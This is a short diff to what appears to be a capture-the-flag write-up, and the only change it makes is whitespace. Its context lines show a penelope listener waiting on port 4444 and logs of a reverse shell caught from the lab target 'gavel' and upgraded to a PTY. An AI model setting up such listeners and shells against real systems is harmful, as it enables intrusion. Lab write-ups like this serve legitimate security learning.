@@ -156,7 +156,7 @@ Enter the bid amount on the item, you changed the rule. After clicking on place 
 ```bash
 kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 10.10.14.21
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)                                                                                     
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from gavel~10.129.253.62-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
